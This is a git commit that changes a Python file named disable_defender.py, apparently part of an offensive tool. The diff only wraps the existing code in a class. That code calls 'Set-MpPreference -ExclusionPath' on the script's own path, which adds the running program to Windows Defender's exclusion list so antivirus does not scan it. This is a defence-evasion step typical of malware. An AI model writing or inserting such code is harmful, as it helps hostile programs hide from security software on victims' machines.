ed930baaa748ac87df1f387c1d80c9e5f2b44c0d
Silky <96620548+S1LKT0UCH@users.noreply.github.com>
2023-03-27 18:35:00 +0200

    Update disable_defender.py

--- source/disable_defender.py
+++ source/disable_defender.py
@@ -1,5 +1,6 @@
-import subprocess
-from sys import argv
+class disabledefender():
+    import subprocess
+    from sys import argv
 
-curr = argv[0]
-subprocess.run(f"Set-MpPreference -ExclusionPath {curr}", shell=True)
+    curr = argv[0]
+    subprocess.run(f"Set-MpPreference -ExclusionPath {curr}", shell=True)
